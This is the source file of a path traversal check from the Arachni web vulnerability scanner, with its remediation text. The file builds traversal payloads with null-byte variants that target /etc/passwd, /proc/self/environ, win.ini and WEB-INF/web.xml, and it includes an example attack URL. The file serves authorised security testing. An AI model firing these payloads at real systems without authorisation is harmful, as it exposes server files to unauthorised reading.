=begin
    Copyright 2010-2017 Sarosys LLC <http://www.sarosys.com>

    This file is part of the Arachni Framework project and is subject to
    redistribution and commercial restrictions. Please see the Arachni Framework
    web site for more information on licensing and terms of use.
=end

# Path Traversal check.
#
# @author Tasos "Zapotek" Laskos <tasos.laskos@arachni-scanner.com>
#
# @see http://cwe.mitre.org/data/definitions/22.html
# @see https://www.owasp.org/index.php/Path_Traversal
# @see http://projects.webappsec.org/Path-Traversal
class Arachni::Checks::PathTraversal < Arachni::Check::Base

    MINIMUM_TRAVERSALS = 0
    MAXIMUM_TRAVERSALS = 8

    def self.options
        @options ||= {
            format:     [Format::STRAIGHT],
            signatures: FILE_SIGNATURES_PER_PLATFORM,

            # Add one more mutation (on the fly) which will include the extension
            # of the original value (if that value was a filename) after a null byte.
            each_mutation: proc do |mutation|
                next if !mutation.affected_input_value

                # Don't bother if the current element type can't carry nulls.
                next if !mutation.valid_input_value_data?( "\0" )

                m = mutation.dup

                # Figure out the extension of the default value, if it has one.
                ext = m.default_inputs[m.affected_input_name].to_s.split( '.' )
                ext = ext.size > 1 ? ext.last : nil

                # Null-terminate the injected value and append the ext.
                m.affected_input_value += "\0.#{ext}"

                # Pass our new element back to be audited.
                m
            end,

            skip_like: proc do |m|
                # Java payloads begin with a traversal which won't be preserved
                # via LinkTemplate injections so don't bother.
                m.is_a?( LinkTemplate ) && m.audit_options[:platform] == :java
            end
        }
    end

    def self.payloads
        return @payloads if @payloads

        @payloads = {
            unix:    [
                '/proc/self/environ',
                '/etc/passwd'
            ],
            windows: [
                'boot.ini',
                'windows/win.ini',
                'winnt/win.ini'
            ].map { |payload| [payload, "#{payload}#{'.'* 700}"] }.flatten
        }.inject({}) do |h, (platform, payloads)|
            h[platform] = payloads.map do |payload|
                trv = '/'
                (MINIMUM_TRAVERSALS..MAXIMUM_TRAVERSALS).map do
                    trv << '../'
                    [ "#{trv}#{payload}", "file://#{trv}#{payload}" ]
                end
            end.flatten

            h
        end

        @payloads[:java] = [ '/../../', '../../', ].map do |trv|
             [ "#{trv}WEB-INF/web.xml", "file://#{trv}WEB-INF/web.xml" ]
        end.flatten

        @payloads
    end

    def run
        audit self.class.payloads, self.class.options
    end

    def self.info
        {
            name:        'Path Traversal',
            description: %q{
It injects paths of common files ( like `/etc/passwd` and `boot.ini`) and
evaluates the existence of a path traversal vulnerability based on the presence
of relevant content in the HTML responses.
},
            elements:    ELEMENTS_WITH_INPUTS,
            author:      'Tasos "Zapotek" Laskos <tasos.laskos@arachni-scanner.com> ',
            version:     '0.4.8',
            platforms:   payloads.keys,

            issue:       {
                name:            %q{Path Traversal},
                description:     %q{
Web applications occasionally use parameter values to store the location of a file
which will later be required by the server.

An example of this is often seen in error pages, where the actual file path for
the error page is stored in a parameter value -- for example `example.com/error.php?page=404.php`.

A path traversal occurs when the parameter value (ie. path to file being called
by the server) can be substituted with the relative path of another resource which
is located outside of the applications working directory. The server then loads
the resource and includes its contents in the response to the client.

Cyber-criminals will abuse this vulnerability to view files that should otherwise
not be accessible.

A very common example of this, on *nix servers, is gaining access to the `/etc/passwd`
file in order to retrieve a list of server users. This attack would look like:
`yoursite.com/error.php?page=../../../../etc/passwd`

As path traversal is based on the relative path, the payload must first traverse
to the file system's root directory, hence the string of `../../../../`.

Arachni discovered that it was possible to substitute a parameter value with a
relative path to a common operating system file and have the contents of the file
included in the response.
},
                references:  {
                    'OWASP' => 'https://www.owasp.org/index.php/Path_Traversal',
                    'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
                },
                tags:            %w(path traversal injection regexp),
                cwe:             22,
                severity:        Severity::HIGH,
                remedy_guidance: %q{
It is recommended that untrusted data is never used to form a file location to
be included.

To validate data, the application should ensure that the supplied value for a file
is permitted. This can be achieved by performing whitelisting on the parameter
value, by matching it against a list of permitted files. If the supplied value
does not match any value in the whitelist, then the server should redirect to a
standard error page.

In some scenarios, where dynamic content is being requested, it may not be possible
to perform validation against a list of trusted resources, therefore the list must
also become dynamic (updated as the files change), or perform filtering to remove
extraneous user input (such as semicolons, periods etc.) and only permit `a-z0-9`.

It is also advised that sensitive files are not stored within the web root and
that the user permissions enforced by the directory are correct.
}
            }
        }
    end

end
